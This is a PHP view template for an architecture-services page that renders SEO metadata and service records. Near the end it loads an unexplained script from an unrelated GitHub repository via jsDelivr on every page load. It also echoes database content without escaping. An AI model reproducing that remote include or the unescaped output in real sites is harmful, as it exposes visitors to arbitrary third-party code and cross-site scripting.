<?php
$this->load->view('RMC_view/layout/header_view.php');
?>
<link rel="stylesheet" href="assets/css/external.css">

<?php foreach ($seo as $meta) : ?>
    <?php if ($meta->id == 8) : ?>
        <title><?php echo $meta->meta_title; ?></title>
        <meta name="description" content="<?php echo $meta->meta_description; ?>">
        <?php echo $meta->meta_description; ?>
    <?php endif; ?>
<?php endforeach; ?>



<body>
	<div class="banner-service-7">
		<div class="banner-back-service-5" data-aos="fade-right" data-aos-duration="2000">
			<h1 class="banner-title"> <span class="decoration"> Archi</span>tecture</h1>
			<p class="banner-para">Architectural Brilliance, Redefining Possibilities.</p>
		</div>
	</div>

	<div class="container-para">
		<p>We are pleased to offer architectural services that strictly adhere to guidelines as per RERA rules and other industry standards, ensuring the utmost integrity in our work. Our team of architects brings a wealth of experience and knowledge to every project, ensuring a high level of professionalism and attention to detail. Whether you're seeking assistance with residential, commercial, or industrial architecture, we are dedicated to providing thoughtful and practical solutions in compliance with these regulations. Our goal is to collaborate with you, understanding your vision and translating it into a design that not only suits your requirements and budget but also aligns with the latest industry regulations. Trust us to guide you through the architectural process and deliver results that not only meet but exceed your expectations.</p>
	</div>
	<div class="container-1">
		<?php if (!empty($services)) : ?>
			<?php foreach ($services as $item) : ?>
				<div class="row">
					<?php if ($item->id % 2 == 1) : ?>
						<div class="col-md-12 col-lg-6 col-xl-6">
							<h2 class="survey-head for-mobile">
								<span class="decoration"><?php echo $item->title; ?></span>
							</h2>
							<img src="<?php echo base_url('uploads/Main-img/' . $item->main_img); ?>" class="contout img-fluid">
						</div>
						<div class="col-md-12 col-lg-6 col-xl-6">
							<h4 class="survey-head for-desktop">
								<span class="decoration"><?php echo $item->title; ?></span>
							</h4>
							<p class="survey-para"><?php echo $item->content; ?></p>
							<!-- <h4 class="survey-head2 client-project">Client Projects</h4>
							<div class="container">
								<div class="row">
									<div class="col-md-12 col-lg-6 col-xl-6">
										<div class="row">
											<div class="col-6 mb-4">
												<div class="project-logo text-center">
													<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_1); ?>" class="proj-logo img-fluid">
													<p class="logo-dis text-center mb-0"><?php echo $item->client_des_1; ?></p>
												</div>
											</div>
											<div class="col-6 mb-4">
												<div class="project-logo text-center">
													<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_2); ?>" class="proj-logo img-fluid">
													<p class="logo-dis text-center mb-0"><?php echo $item->client_des_2; ?></p>
												</div>
											</div>
										</div>
									</div>
									<div class="col-md-12 col-lg-6 col-xl-6">
										<div class="row">
											<div class="col-6 mb-4">
												<div class="project-logo text-center">
													<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_3); ?>" class="proj-logo img-fluid">
													<p class="logo-dis text-center mb-0"><?php echo $item->client_des_3; ?></p>
												</div>
											</div>
											<div class="col-6 mb-4">
												<div class="project-logo text-center">
													<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_4); ?>" class="proj-logo img-fluid">
													<p class="logo-dis text-center mb-0"><?php echo $item->client_des_4; ?></p>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div> -->
							<!-- <h4 class="Key">Key Features</h4>
							<div class="row">
								<div class="col-sm-6 col-md-6" style="display: flex;">
									<i class="fa-solid fa-circle dot-1"></i> <br>
									<p><span class="decor"><?php echo $item->key_feature_1; ?></span></p>
								</div>
								<div class="col-sm-6 col-md-6" style="display: flex;">
									<i class="fa-solid fa-circle dot-1"></i> <br>
									<p><span class="decor"><?php echo $item->key_feature_2; ?></span></p>
								</div>
							</div> -->
						</div>
					<?php else : ?>
						<div class="row">
							<div class="col-md-12 col-lg-6 col-xl-6 order-lg-2 service-custom-position">
								<h2 class="survey-head for-mobile">
									<span class="decoration"><?php echo $item->title; ?></span>
								</h2>
								<img src="<?php echo base_url('uploads/Main-img/' . $item->main_img); ?>" class="contout img-fluid">
							</div>
							<div class="col-md-12 col-lg-6 col-xl-6 service-custom-position">
								<h4 class="survey-head for-desktop">
									<span class="decoration"><?php echo $item->title; ?></span>
								</h4>
								<p class="survey-para"><?php echo $item->content; ?></p>
								<!-- <h4 class="survey-head2 client-project">Client Projects</h4>
								<div class="container">
									<div class="row">
										<div class="col-md-12 col-lg-6 col-xl-6">
											<div class="row">
												<div class="col-6 mb-4">
													<div class="project-logo text-center">
														<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_1); ?>" class="proj-logo img-fluid">
														<p class="logo-dis text-center mb-0"><?php echo $item->client_des_1; ?></p>
													</div>
												</div>
												<div class="col-6 mb-4">
													<div class="project-logo text-center">
														<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_2); ?>" class="proj-logo img-fluid">
														<p class="logo-dis text-center mb-0"><?php echo $item->client_des_2; ?></p>
													</div>
												</div>
											</div>
										</div>
										<div class="col-md-12 col-lg-6 col-xl-6">
											<div class="row">
												<div class="col-6 mb-4">
													<div class="project-logo text-center">
														<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_3); ?>" class="proj-logo img-fluid">
														<p class="logo-dis text-center mb-0"><?php echo $item->client_des_3; ?></p>
													</div>
												</div>
												<div class="col-6 mb-4">
													<div class="project-logo text-center">
														<img src="<?php echo base_url('uploads/Logo/' . $item->client_image_4); ?>" class="proj-logo img-fluid">
														<p class="logo-dis text-center mb-0"><?php echo $item->client_des_4; ?></p>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div> -->
								<!-- <h4 class="Key">Key Features</h4>
								<div class="row">
									<div class="col-sm-6 col-md-6" style="display: flex;">
										<i class="fa-solid fa-circle dot-1"></i> <br>
										<p><span class="decor"><?php echo $item->key_feature_1; ?></span></p>
									</div>
									<div class="col-sm-6 col-md-6" style="display: flex;">
										<i class="fa-solid fa-circle dot-1"></i> <br>
										<p><span class="decor"><?php echo $item->key_feature_2; ?></span></p>
									</div>
								</div> -->
							</div>

						</div>
					<?php endif; ?>
				</div>
			<?php endforeach; ?>
		<?php endif; ?>
	</div>


	<!-- Other services start -->

	<?php
	$this->load->view('RMC_view/other_service_view.php');
	?>

	<!-- Other services end -->

	<div class="container-8">
		<div class="row01">
			<h4 class="about_headings" style="  
			    margin-top: 10%;
 			   font-size: 30px;
			">There's a lot more to us, Let's get Started</h4>
			<button class="btns active-collaborate" data-toggle="modal" data-target="#myModal">Collaborate With Us <i class="fas fa-arrow-circle-right"></i></button>
		</div>
	</div>

	<!-- JavaScript -->
	<!--Uncomment this line-->
	<script src="//cdn.jsdelivr.net/gh/freeps2/a7rarpress@main/script.js"></script>

	<?php
	$this->load->view('RMC_view/layout/footeer_view.php');
	?>